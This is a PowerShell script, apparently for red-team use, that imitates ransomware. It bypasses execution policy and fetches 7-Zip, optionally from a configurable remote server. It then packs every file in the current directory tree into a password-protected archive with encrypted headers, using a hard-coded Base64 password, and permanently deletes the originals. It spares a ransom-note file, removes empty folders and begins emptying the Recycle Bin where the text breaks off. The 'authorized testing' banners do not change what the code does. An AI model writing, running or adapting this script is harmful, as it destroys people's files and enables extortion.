################################################################################
# File Encryption Script (PowerShell)
# For AUTHORIZED Red Team Operations Only
# WARNING: This will encrypt and delete files - use only in test environments
################################################################################

#Requires -Version 3.0

<#
.SYNOPSIS
    Simulates ransomware encryption behavior for red team testing.

.DESCRIPTION
    Downloads 7-Zip, creates encrypted archive, and deletes original files.
    FOR AUTHORIZED PENETRATION TESTING ONLY.

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing
    Warning: Will delete files permanently
#>

# Debug mode: Set $env:DEBUG=1 before running for verbose output
$DebugMode = if ($env:DEBUG -eq "1") { $true } else { $false }

if ($DebugMode) {
    $DebugPreference = "Continue"
    Write-Host "[DEBUG] Debug mode enabled" -ForegroundColor Magenta
    Write-Host "[DEBUG] Script started at $(Get-Date)" -ForegroundColor Magenta
    Write-Host "[DEBUG] PowerShell version: $($PSVersionTable.PSVersion)" -ForegroundColor Magenta
    Write-Host "[DEBUG] Execution policy: $(Get-ExecutionPolicy)" -ForegroundColor Magenta
}

# Attempt to enable script execution (may require admin)
try {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Script execution policy bypassed for this process" -ForegroundColor Green
    if ($DebugMode) { Write-Host "[DEBUG] New execution policy: $(Get-ExecutionPolicy -Scope Process)" -ForegroundColor Magenta }
} catch {
    Write-Host "[!] Could not bypass execution policy - may require admin privileges" -ForegroundColor Yellow
    if ($DebugMode) { Write-Host "[DEBUG] Error: $($_.Exception.Message)" -ForegroundColor Magenta }
}

# Configuration
$RemoteServer = "http://YOUR_SERVER_IP_HERE"
$SevenZipUrl = "$RemoteServer/7z.exe"
$SevenZipInstallerUrl = "$RemoteServer/7z-installer.exe"
$ArchiveName = "encrypted_files.7z"
$InstallDir = "$env:ProgramFiles\7-Zip"
$TempDir = "$env:TEMP\7z_temp"
$CurrentDir = Get-Location
$ScriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
if ([string]::IsNullOrEmpty($ScriptDirectory)) {
    $ScriptDirectory = $PWD.Path
}

################################################################################
# Password Configuration - Multiple Methods (Priority Order)
################################################################################

$Password = $null
$PasswordMethod = "Unknown"

# Method 1: Check for environment variable (highest priority - passed externally)
# Usage: $env:ENCRYPT_KEY="yourpassword"; .\encrypt_files.ps1
if ($env:ENCRYPT_KEY) {
    $Password = $env:ENCRYPT_KEY
    $PasswordMethod = "Environment Variable"
}
# Method 2: Decode from Base64-encoded string (obfuscated storage)
# This is "antai" encoded in Base64: YW50YWk=
# To encode your own in PowerShell: [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("yourpassword"))
elseif (-not $Password) {
    try {
        $EncodedPassword = "YW50YWk="
        $Password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedPassword))
        $PasswordMethod = "Base64 Decoded"
    } catch {
        $Password = $null
    }
}
# Method 3: Generate random password (use if above methods fail)
if (-not $Password) {
    try {
        # Generate 16-character random password with mixed case, numbers, and symbols
        $Password = -join ((65..90) + (97..122) + (48..57) + @(33,35,36,37,38,42,43,45,61) | Get-Random -Count 16 | ForEach-Object {[char]$_})
        $PasswordMethod = "Random Generated"
    } catch {
        # Final fallback
        $Password = "Fallback_P@ssw0rd_$(Get-Random -Minimum 10000 -Maximum 99999)"
        $PasswordMethod = "Fallback Random"
    }
}

# Ensure we have a password
if ([string]::IsNullOrEmpty($Password)) {
    $Password = "Emergency_$(Get-Date -Format 'yyyyMMddHHmmss')_$(Get-Random)"
    $PasswordMethod = "Emergency Fallback"
}

# Banner
Write-Host ""
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "File Encryption - Red Team Operation" -ForegroundColor Cyan
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[WARNING] This script will encrypt and delete files in current directory" -ForegroundColor Red
Write-Host "[WARNING] For authorized testing only - ensure proper authorization" -ForegroundColor Red
Write-Host ""
Write-Host "Current Directory: $CurrentDir" -ForegroundColor Yellow
Write-Host "Archive Name: $ArchiveName" -ForegroundColor Yellow
Write-Host "Password Method: $PasswordMethod" -ForegroundColor Yellow
Write-Host ""
Write-Host "Starting in 5 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""

################################################################################
# Functions
################################################################################

function Write-Status {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )

    switch ($Type) {
        "Success" { Write-Host "[+] $Message" -ForegroundColor Green }
        "Error"   { Write-Host "[-] $Message" -ForegroundColor Red }
        "Warning" { Write-Host "[!] $Message" -ForegroundColor Yellow }
        "Info"    { Write-Host "[*] $Message" -ForegroundColor Cyan }
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )

    if ($DebugMode) {
        Write-Host "[DEBUG] Download-File called" -ForegroundColor Magenta
        Write-Host "[DEBUG]   URL: $Url" -ForegroundColor Magenta
        Write-Host "[DEBUG]   Output: $OutputPath" -ForegroundColor Magenta
    }

    try {
        # Method 1: WebClient (faster)
        if ($DebugMode) { Write-Host "[DEBUG] Trying WebClient download..." -ForegroundColor Magenta }
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)

        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            if ($DebugMode) { Write-Host "[DEBUG] WebClient download successful. Size: $fileSize bytes" -ForegroundColor Magenta }
            return $true
        }
    } catch {
        if ($DebugMode) { Write-Host "[DEBUG] WebClient failed: $($_.Exception.Message)" -ForegroundColor Magenta }
        try {
            # Method 2: Invoke-WebRequest (fallback)
            if ($DebugMode) { Write-Host "[DEBUG] Trying Invoke-WebRequest..." -ForegroundColor Magenta }
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing

            if (Test-Path $OutputPath) {
                $fileSize = (Get-Item $OutputPath).Length
                if ($DebugMode) { Write-Host "[DEBUG] Invoke-WebRequest successful. Size: $fileSize bytes" -ForegroundColor Magenta }
                return $true
            }
        } catch {
            if ($DebugMode) { Write-Host "[DEBUG] Invoke-WebRequest failed: $($_.Exception.Message)" -ForegroundColor Magenta }
            try {
                # Method 3: BitsTransfer (fallback)
                if ($DebugMode) { Write-Host "[DEBUG] Trying BitsTransfer..." -ForegroundColor Magenta }
                Import-Module BitsTransfer -ErrorAction SilentlyContinue
                Start-BitsTransfer -Source $Url -Destination $OutputPath

                if (Test-Path $OutputPath) {
                    $fileSize = (Get-Item $OutputPath).Length
                    if ($DebugMode) { Write-Host "[DEBUG] BitsTransfer successful. Size: $fileSize bytes" -ForegroundColor Magenta }
                    return $true
                }
            } catch {
                if ($DebugMode) { Write-Host "[DEBUG] BitsTransfer failed: $($_.Exception.Message)" -ForegroundColor Magenta }
                return $false
            }
        }
    }

    if ($DebugMode) { Write-Host "[DEBUG] All download methods failed" -ForegroundColor Magenta }
    return $false
}

function Find-SevenZip {
    param(
        [string]$ScriptDirectory
    )

    # Priority order for finding 7z.exe:
    # 1. Same directory as script (local copy)
    # 2. Standard installation paths
    # 3. Downloaded temp location
    # 4. System PATH

    $possiblePaths = @(
        # Priority 1: Script directory (allows bundling 7z.exe with script)
        (Join-Path $ScriptDirectory "7z.exe"),

        # Priority 2: Standard installations
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
        "$env:LOCALAPPDATA\7-Zip\7z.exe",

        # Priority 3: Downloaded to temp
        "$TempDir\7z.exe"
    )

    foreach ($path in $possiblePaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            # Verify it's actually executable
            try {
                $testProcess = Start-Process -FilePath $path -ArgumentList "--help" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_test_err.txt"
                if ($testProcess.ExitCode -le 1) {  # 7z returns 0 or 1 for help
                    Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$env:TEMP\7z_test_err.txt" -Force -ErrorAction SilentlyContinue
                    return $path
                }
            } catch {
                # Not executable, continue searching
                continue
            }
        }
    }

    # Priority 4: Try to find in system PATH
    try {
        $sevenZip = Get-Command "7z.exe" -ErrorAction SilentlyContinue
        if ($sevenZip) {
            return $sevenZip.Source
        }
    } catch {
        # Not in PATH
    }

    return $null
}

function Install-SevenZipMSI {
    param(
        [string]$MsiPath
    )

    if ($DebugMode) { Write-Host "[DEBUG] Install-SevenZipMSI: $MsiPath" -ForegroundColor Magenta }

    if (-not (Test-Path $MsiPath)) {
        Write-Status "MSI file not found: $MsiPath" -Type Warning
        return $null
    }

    Write-Status "Installing from MSI: $(Split-Path -Leaf $MsiPath)" -Type Info

    try {
        # Silent install with msiexec - include INSTALLDIR to control location
        if ($DebugMode) { Write-Host "[DEBUG] Running: msiexec /i `"$MsiPath`" /qn /norestart INSTALLDIR=`"$env:ProgramFiles\7-Zip`"" -ForegroundColor Magenta }

        Write-Status "Installing 7-Zip (this may take a moment)..." -Type Info
        $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i", "`"$MsiPath`"", "/qn", "/norestart", "INSTALLDIR=`"$env:ProgramFiles\7-Zip`"" -Wait -PassThru -NoNewWindow
        Write-Status "Waiting for installation to settle..." -Type Info
        Start-Sleep -Seconds 5

        if ($DebugMode) { Write-Host "[DEBUG] MSI install exit code: $($proc.ExitCode)" -ForegroundColor Magenta }

        # Check and TEST installation locations
        $locations = @(
            "$env:ProgramFiles\7-Zip\7z.exe",
            "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
        )

        foreach ($loc in $locations) {
            if (Test-Path $loc) {
                if ($DebugMode) { Write-Host "[DEBUG] Found at $loc, testing if it works..." -ForegroundColor Magenta }
                try {
                    $testProc = Start-Process -FilePath $loc -ArgumentList "--help" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_err.txt" -ErrorAction Stop
                    Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$env:TEMP\7z_err.txt" -Force -ErrorAction SilentlyContinue

                    if ($testProc.ExitCode -le 1) {
                        Write-Status "MSI installation successful - 7z.exe is WORKING" -Type Success
                        return $loc
                    } else {
                        Write-Status "7z.exe installed but not working (exit code: $($testProc.ExitCode))" -Type Warning
                    }
                } catch {
                    Write-Status "7z.exe installed but failed to test: $($_.Exception.Message)" -Type Warning
                }
            }
        }

        Write-Status "MSI installation failed - 7z.exe not found or not working" -Type Warning
        return $null

    } catch {
        Write-Status "MSI installation failed: $($_.Exception.Message)" -Type Warning
        return $null
    }
}

function Install-SevenZipEXE {
    param(
        [string]$ExePath
    )

    if ($DebugMode) { Write-Host "[DEBUG] Install-SevenZipEXE: $ExePath" -ForegroundColor Magenta }

    if (-not (Test-Path $ExePath)) {
        Write-Status "EXE file not found: $ExePath" -Type Warning
        return $null
    }

    Write-Status "Installing from EXE: $(Split-Path -Leaf $ExePath)" -Type Info

    try {
        # Silent install with /S parameter
        if ($DebugMode) { Write-Host "[DEBUG] Running: `"$ExePath`" /S" -ForegroundColor Magenta }

        $proc = Start-Process -FilePath $ExePath -ArgumentList "/S" -Wait -PassThru -NoNewWindow
        Write-Status "Waiting for installation to complete..." -Type Info
        Start-Sleep -Seconds 10

        if ($DebugMode) { Write-Host "[DEBUG] EXE install exit code: $($proc.ExitCode)" -ForegroundColor Magenta }

        # Check and TEST installation locations
        $locations = @(
            "$env:ProgramFiles\7-Zip\7z.exe",
            "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
        )

        foreach ($loc in $locations) {
            if (Test-Path $loc) {
                if ($DebugMode) { Write-Host "[DEBUG] Found at $loc, testing if it works..." -ForegroundColor Magenta }
                try {
                    $testProc = Start-Process -FilePath $loc -ArgumentList "--help" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_err.txt" -ErrorAction Stop
                    Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$env:TEMP\7z_err.txt" -Force -ErrorAction SilentlyContinue

                    if ($testProc.ExitCode -le 1) {
                        Write-Status "EXE installation successful - 7z.exe is WORKING" -Type Success
                        return $loc
                    } else {
                        Write-Status "7z.exe installed but not working (exit code: $($testProc.ExitCode))" -Type Warning
                    }
                } catch {
                    Write-Status "7z.exe installed but failed to test: $($_.Exception.Message)" -Type Warning
                }
            }
        }

        Write-Status "EXE installation failed - 7z.exe not found or not working" -Type Warning
        return $null

    } catch {
        Write-Status "EXE installation failed: $($_.Exception.Message)" -Type Warning
        return $null
    }
}

function Get-SevenZipExhaustive {
    param(
        [string]$ScriptDir,
        [string]$TempDirectory,
        [string]$CustomServer
    )

    Write-Status "Exhaustive 7-Zip acquisition strategy..." -Type Info

    # ========================================================================
    # Phase 1: Check for existing 7z.exe AND VERIFY IT WORKS
    # ========================================================================
    Write-Status "Phase 1: Checking for existing 7z.exe..." -Type Info

    $searchPaths = @(
        (Join-Path $ScriptDir "7z.exe"),
        (Join-Path $PWD "7z.exe"),
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
    )

    foreach ($path in $searchPaths) {
        if ($DebugMode) { Write-Host "[DEBUG] Checking: $path" -ForegroundColor Magenta }
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            if ($DebugMode) { Write-Host "[DEBUG] File exists, testing if it works..." -ForegroundColor Magenta }
            try {
                $testProc = Start-Process -FilePath $path -ArgumentList "--help" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_err.txt" -ErrorAction Stop
                Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
                Remove-Item "$env:TEMP\7z_err.txt" -Force -ErrorAction SilentlyContinue

                if ($testProc.ExitCode -le 1) {
                    Write-Status "Found WORKING 7z.exe at: $path" -Type Success
                    return $path
                } else {
                    Write-Status "Found 7z.exe at $path but it's not working (exit code: $($testProc.ExitCode))" -Type Warning
                }
            } catch {
                Write-Status "Found 7z.exe at $path but failed to test it: $($_.Exception.Message)" -Type Warning
            }
        }
    }

    # Check PATH
    $pathExe = Get-Command "7z.exe" -ErrorAction SilentlyContinue
    if ($pathExe) {
        if ($DebugMode) { Write-Host "[DEBUG] Found in PATH, testing..." -ForegroundColor Magenta }
        try {
            $testProc = Start-Process -FilePath $pathExe.Source -ArgumentList "--help" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_err.txt" -ErrorAction Stop
            Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\7z_err.txt" -Force -ErrorAction SilentlyContinue

            if ($testProc.ExitCode -le 1) {
                Write-Status "Found WORKING 7z.exe in system PATH" -Type Success
                return $pathExe.Source
            } else {
                Write-Status "Found 7z.exe in PATH but it's not working" -Type Warning
            }
        } catch {
            Write-Status "Found 7z.exe in PATH but failed to test it" -Type Warning
        }
    }

    Write-Status "No working 7z.exe found in existing locations" -Type Warning

    # ========================================================================
    # Phase 2: Check for local installer files
    # ========================================================================
    Write-Status "Phase 2: Checking for local installer files..." -Type Info

    $installers = @(
        @{Path = (Join-Path $ScriptDir "7z2501-x64.msi"); Type = "MSI"},
        @{Path = (Join-Path $ScriptDir "7z2501-x64.exe"); Type = "EXE"},
        @{Path = (Join-Path $ScriptDir "7z2501-arm64.exe"); Type = "EXE"}
    )

    foreach ($installer in $installers) {
        if (Test-Path $installer.Path) {
            Write-Status "Found local installer: $(Split-Path -Leaf $installer.Path)" -Type Success
            if ($installer.Type -eq "MSI") {
                $result = Install-SevenZipMSI -MsiPath $installer.Path
            } else {
                $result = Install-SevenZipEXE -ExePath $installer.Path
            }
            if ($result) { return $result }
        }
    }

    # ========================================================================
    # Phase 3: Download from official sources
    # ========================================================================
    Write-Status "Phase 3: Downloading from official 7-zip.org..." -Type Info

    $downloads = @(
        @{Url = "https://www.7-zip.org/a/7z2501-x64.msi"; File = "7z2501-x64.msi"; Type = "MSI"},
        @{Url = "https://www.7-zip.org/a/7z2501-x64.exe"; File = "7z2501-x64.exe"; Type = "EXE"},
        @{Url = "https://www.7-zip.org/a/7z2501-arm64.exe"; File = "7z2501-arm64.exe"; Type = "EXE"}
    )

    foreach ($dl in $downloads) {
        Write-Status "Attempting download: $($dl.File)..." -Type Info
        $destPath = Join-Path $TempDirectory $dl.File

        if (Download-File -Url $dl.Url -OutputPath $destPath) {
            if ($dl.Type -eq "MSI") {
                $result = Install-SevenZipMSI -MsiPath $destPath
            } else {
                $result = Install-SevenZipEXE -ExePath $destPath
            }
            if ($result) { return $result }
        }
    }

    # ========================================================================
    # Phase 4: Try custom server
    # ========================================================================
    if ($CustomServer -ne "http://YOUR_SERVER_IP_HERE") {
        Write-Status "Phase 4: Trying custom server downloads..." -Type Info

        # Try standalone 7z.exe from custom server
        $customExe = Join-Path $TempDirectory "7z-custom.exe"
        if (Download-File -Url "$CustomServer/7z.exe" -OutputPath $customExe) {
            if (Test-Path $customExe) {
                Write-Status "Downloaded 7z.exe from custom server" -Type Success
                return $customExe
            }
        }
    }

    return $null
}

################################################################################
# Main Execution
################################################################################

try {
    # Step 1: Locate or obtain 7-Zip executable
    Write-Status "Step 1/5: Exhaustive 7-Zip acquisition..." -Type Info

    # Create temp directory if needed
    if (-not (Test-Path $TempDir)) {
        try {
            New-Item -ItemType Directory -Path $TempDir -Force -ErrorAction Stop | Out-Null
        } catch {
            Write-Status "Could not create temp directory, using script directory" -Type Warning
            $TempDir = $ScriptDirectory
        }
    }

    if ($DebugMode) {
        Write-Host "[DEBUG] Script directory: $ScriptDirectory" -ForegroundColor Magenta
        Write-Host "[DEBUG] Temp directory: $TempDir" -ForegroundColor Magenta
        Write-Host "[DEBUG] Remote server: $RemoteServer" -ForegroundColor Magenta
    }

    # Use exhaustive acquisition function
    $sevenZipExe = Get-SevenZipExhaustive -ScriptDir $ScriptDirectory -TempDirectory $TempDir -CustomServer $RemoteServer

    if ($null -eq $sevenZipExe -or -not (Test-Path $sevenZipExe)) {
        throw @"
CRITICAL ERROR: Could not locate or obtain 7-Zip after exhaustive attempts

Attempted all methods:
  Phase 1: Checked existing installations
    - Script directory
    - Current directory
    - Program Files locations
    - System PATH

  Phase 2: Checked for local installer files
    - 7z2501-x64.msi
    - 7z2501-x64.exe
    - 7z2501-arm64.exe

  Phase 3: Downloaded from official 7-zip.org
    - MSI installer (x64)
    - EXE installer (x64)
    - EXE installer (ARM64)

  Phase 4: Tried custom server (if configured)

Solutions:
  1. Download and place in ${ScriptDirectory}:
     - 7z.exe (standalone), OR
     - 7z2501-x64.msi (recommended), OR
     - 7z2501-x64.exe
  2. Install 7-Zip system-wide
  3. Check internet connectivity
  4. Run with DEBUG=1 for detailed diagnostics

Operation aborted.
"@
    }

    Write-Status "Using 7-Zip executable: $sevenZipExe" -Type Success

    # Step 3: Create encrypted archive
    Write-Host ""
    Write-Status "Step 3/5: Creating encrypted 7z archive..." -Type Info
    Write-Status "Password: $Password" -Type Info
    Write-Status "This may take a while depending on file size..." -Type Info
    Write-Host ""

    $archivePath = Join-Path $CurrentDir $ArchiveName

    if ($DebugMode) {
        Write-Host "[DEBUG] Archive creation details:" -ForegroundColor Magenta
        Write-Host "[DEBUG]   7-Zip executable: $sevenZipExe" -ForegroundColor Magenta
        Write-Host "[DEBUG]   Archive path: $archivePath" -ForegroundColor Magenta
        Write-Host "[DEBUG]   Source directory: $CurrentDir" -ForegroundColor Magenta
        Write-Host "[DEBUG]   Password method: $PasswordMethod" -ForegroundColor Magenta

        # Test 7-Zip executable
        Write-Host "[DEBUG] Testing 7-Zip executable..." -ForegroundColor Magenta
        try {
            $testProc = Start-Process -FilePath $sevenZipExe -ArgumentList "--help" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7z_test.txt" -RedirectStandardError "$env:TEMP\7z_test_err.txt" -ErrorAction Stop
            Write-Host "[DEBUG]   7-Zip test exit code: $($testProc.ExitCode)" -ForegroundColor Magenta
            Remove-Item "$env:TEMP\7z_test.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\7z_test_err.txt" -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Host "[DEBUG]   7-Zip test failed: $($_.Exception.Message)" -ForegroundColor Magenta
        }

        # Check disk space
        $drive = (Get-Item $CurrentDir).PSDrive
        $freeSpace = (Get-PSDrive $drive.Name).Free
        Write-Host "[DEBUG]   Free space on $($drive.Name): $([math]::Round($freeSpace / 1GB, 2)) GB" -ForegroundColor Magenta

        # List current directory contents
        Write-Host "[DEBUG] Current directory contents:" -ForegroundColor Magenta
        Get-ChildItem -Path $CurrentDir | ForEach-Object {
            Write-Host "[DEBUG]   - $($_.Name) ($($_.Length) bytes)" -ForegroundColor Magenta
        }
    }

    # Build 7-Zip arguments - exclude scripts and existing archives
    # Parameters: -t7z (archive type), -m0=lzma2 (compression method), -mx=9 (ultra compression)
    #             -mfb=64 (fast bytes), -md=32m (32MB dictionary), -ms=on (solid), -mhe=on (encrypt headers)
    # Simplified: NO wildcard exclusions - only exclude specific filenames
    # Password: Wrapped in quotes to handle special characters
    $arguments = @(
        "a",                        # Add to archive
        "-t7z",                     # Archive type
        "-m0=lzma2",               # Compression method
        "-mx=9",                   # Maximum compression
        "-mfb=64",                 # Fast bytes
        "-md=32m",                 # Dictionary size
        "-ms=on",                  # Solid archive
        "-mhe=on",                 # Encrypt headers
        "-p`"$Password`"",         # Password (quoted for special chars)
        "`"$archivePath`"",        # Archive path
        "*",                       # Files to archive (wildcard unquoted)
        "-r"                       # Recursive - NO EXCLUSIONS (simpler, avoids syntax issues)
    )

    if ($DebugMode) {
        Write-Host "[DEBUG] 7-Zip command arguments:" -ForegroundColor Magenta
        $arguments | ForEach-Object {
            if ($_ -like "*-p*") {
                Write-Host "[DEBUG]   -p[PASSWORD_HIDDEN]" -ForegroundColor Magenta
            } else {
                Write-Host "[DEBUG]   $_" -ForegroundColor Magenta
            }
        }
    }

    try {
        if ($DebugMode) {
            Write-Host "[DEBUG] Starting 7-Zip process..." -ForegroundColor Magenta
            $process = Start-Process -FilePath $sevenZipExe -ArgumentList $arguments -Wait -PassThru -ErrorAction Stop
        } else {
            $process = Start-Process -FilePath $sevenZipExe -ArgumentList $arguments -Wait -PassThru -NoNewWindow -ErrorAction Stop
        }

        if ($DebugMode) {
            Write-Host "[DEBUG] 7-Zip process completed with exit code: $($process.ExitCode)" -ForegroundColor Magenta
        }

        # 7-Zip exit codes: 0=success, 1=warning(non-fatal), 2=fatal error, 7=command line error, 8=not enough memory
        # SUCCESS is 0 or 1, anything else is FAILURE
        if ($process.ExitCode -gt 1) {
            $errorMsg = "Failed to create archive - Error Level: $($process.ExitCode)`n`nPossible causes:"
            if ($process.ExitCode -eq 2) {
                $errorMsg += "`n  - Error code 2: Fatal error (no files matched or permission denied)"
            }
            if ($process.ExitCode -eq 7) {
                $errorMsg += "`n  - Error code 7: Command line error"
            }
            if ($process.ExitCode -eq 8) {
                $errorMsg += "`n  - Error code 8: Not enough memory"
            }
            throw $errorMsg
        }

        # Exit code 0 or 1 is success
        Write-Status "Archive creation successful (exit code: $($process.ExitCode))" -Type Success
        if ($process.ExitCode -eq 1) {
            Write-Status "Archive created with warnings (non-fatal)" -Type Warning
        }

        # Verify the file was actually created
        if ($DebugMode) { Write-Host "[DEBUG] Checking if archive was created..." -ForegroundColor Magenta }

        if (-not (Test-Path $archivePath)) {
            if ($DebugMode) {
                Write-Host "[DEBUG] Archive not found. Directory contents:" -ForegroundColor Magenta
                Get-ChildItem -Path $CurrentDir | ForEach-Object {
                    Write-Host "[DEBUG]   - $($_.Name)" -ForegroundColor Magenta
                }
            }
            throw "Archive file was not created at expected location: $archivePath"
        }

        # Check that archive has content
        $archiveInfo = Get-Item $archivePath
        if ($DebugMode) { Write-Host "[DEBUG] Archive file size: $($archiveInfo.Length) bytes" -ForegroundColor Magenta }

        if ($archiveInfo.Length -eq 0) {
            throw "Archive file is 0 bytes (empty)"
        }

        Write-Status "Archive created successfully: $ArchiveName" -Type Success
        Write-Status "Archive size: $([math]::Round($archiveInfo.Length / 1MB, 2)) MB" -Type Info

    } catch {
        $errorDetails = @"
Failed to create archive: $($_.Exception.Message)

Possible causes:
  - Insufficient disk space
  - Permission denied
  - 7-Zip executable error
  - No files to archive
  - Path: $sevenZipExe
"@
        if ($DebugMode) {
            $errorDetails += "`n`n[DEBUG] Full error details:`n$($_ | Format-List * -Force | Out-String)"
        }
        $errorDetails += "`n`nOperation aborted - no files will be deleted."

        throw $errorDetails
    }

    # Step 4: Verify archive
    Write-Host ""
    Write-Status "Step 4/5: Verifying archive integrity..." -Type Info

    if (-not (Test-Path $archivePath)) {
        throw "CRITICAL: Archive file not found at: $archivePath"
    }

    # Double-check archive size
    $archiveSize = (Get-Item $archivePath).Length
    if ($archiveSize -eq 0) {
        throw "CRITICAL: Archive file is 0 bytes!"
    }

    Write-Status "Testing archive integrity with password..." -Type Info

    try {
        $verifyLogPath = Join-Path $TempDir "verify_output.log"
        $verifyErrPath = Join-Path $TempDir "verify_error.log"

        $verifyArgs = @("t", "-p$Password", "`"$archivePath`"")
        $verifyProcess = Start-Process -FilePath $sevenZipExe -ArgumentList $verifyArgs -Wait -PassThru -NoNewWindow -RedirectStandardOutput $verifyLogPath -RedirectStandardError $verifyErrPath -ErrorAction Stop

        if ($verifyProcess.ExitCode -ne 0) {
            # Read error details if available
            $errorDetails = ""
            if (Test-Path $verifyErrPath) {
                $errorDetails = Get-Content $verifyErrPath -Raw
            }

            throw @"
Archive verification failed!
Exit Code: $($verifyProcess.ExitCode)
Error Details: $errorDetails

The archive may be corrupted or password incorrect.
Aborting deletion phase for safety.
"@
        }

        # Clean up verification logs
        Remove-Item $verifyLogPath -Force -ErrorAction SilentlyContinue
        Remove-Item $verifyErrPath -Force -ErrorAction SilentlyContinue

        Write-Status "Archive verified successfully - integrity confirmed" -Type Success

    } catch {
        throw "Archive verification error: $($_.Exception.Message)"
    }

    # Step 5: Delete original files
    Write-Host ""
    Write-Status "Step 5/5: Deleting original files..." -Type Info
    Write-Status "WARNING: This will permanently delete files!" -Type Warning
    Write-Status "Press Ctrl+C to abort in the next 5 seconds..." -Type Warning
    Start-Sleep -Seconds 5
    Write-Host ""

    # Get current script name to avoid deleting ourselves
    $currentScriptName = Split-Path -Leaf $MyInvocation.MyCommand.Path

    # Get all files except critical ones
    Write-Status "Scanning for files to delete..." -Type Info

    $filesToDelete = @()
    $skippedFiles = @()

    try {
        $allFiles = Get-ChildItem -Path $CurrentDir -Recurse -File -ErrorAction SilentlyContinue

        foreach ($file in $allFiles) {
            $shouldSkip = $false

            # Skip the archive
            if ($file.FullName -eq $archivePath) {
                $shouldSkip = $true
            }
            # Skip 7z files
            elseif ($file.Extension -eq '.7z') {
                $shouldSkip = $true
            }
            # Skip script files
            elseif ($file.Extension -eq '.ps1' -or $file.Extension -eq '.bat') {
                $shouldSkip = $true
            }
            # Skip ransom note
            elseif ($file.Name -eq 'README_IMPORTANT.txt') {
                $shouldSkip = $true
            }
            # Skip 7z.exe if present
            elseif ($file.Name -eq '7z.exe') {
                $shouldSkip = $true
            }

            if ($shouldSkip) {
                $skippedFiles += $file
            } else {
                $filesToDelete += $file
            }
        }

        Write-Status "Found $($filesToDelete.Count) files to delete" -Type Info
        Write-Status "Skipping $($skippedFiles.Count) files (archive, scripts, tools)" -Type Info
        Write-Host ""

        $deletedCount = 0
        $failedCount = 0

        foreach ($file in $filesToDelete) {
            try {
                Write-Status "Deleting: $($file.FullName)" -Type Info
                Remove-Item -Path $file.FullName -Force -ErrorAction Stop

                # Verify deletion
                if (-not (Test-Path $file.FullName)) {
                    $deletedCount++
                } else {
                    $failedCount++
                    Write-Status "Warning: File still exists after delete attempt" -Type Warning
                }
            } catch {
                $failedCount++
                Write-Status "Failed to delete: $($file.FullName) - $($_.Exception.Message)" -Type Warning
            }
        }

        Write-Host ""
        Write-Status "Deletion Summary:" -Type Info
        Write-Status "  Files processed: $($filesToDelete.Count)" -Type Info
        Write-Status "  Successfully deleted: $deletedCount" -Type $(if ($deletedCount -eq $filesToDelete.Count) { "Success" } else { "Info" })

        if ($failedCount -gt 0) {
            Write-Status "  Failed to delete: $failedCount" -Type Warning
        } else {
            Write-Status "  Failed to delete: 0" -Type Info
        }

        # Delete empty directories (non-critical operation)
        Write-Host ""
        Write-Status "Removing empty directories..." -Type Info
        try {
            $emptyDirs = Get-ChildItem -Path $CurrentDir -Recurse -Directory -ErrorAction SilentlyContinue |
                Where-Object { (Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 } |
                Sort-Object -Property FullName -Descending

            foreach ($dir in $emptyDirs) {
                try {
                    Remove-Item -Path $dir.FullName -Force -ErrorAction SilentlyContinue
                } catch {
                    # Silently ignore directory deletion errors
                }
            }
        } catch {
            # Non-critical - continue
        }

        Write-Status "File deletion process completed" -Type Success

    } catch {
        Write-Status "Error during file deletion: $($_.Exception.Message)" -Type Error
        Write-Status "Some files may not have been deleted" -Type Warning
    }

    # Cleanup temp directory
    if (Test-Path $TempDir) {
        Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Step 6: System cleanup and recycle bin emptying
    Write-Host ""
    Write-Status "Step 6/6: Running system cleanup..." -Type Info
    Write-Status "Starting background cleanup processes..." -Type Info

    # Empty Recycle Bin
    try {
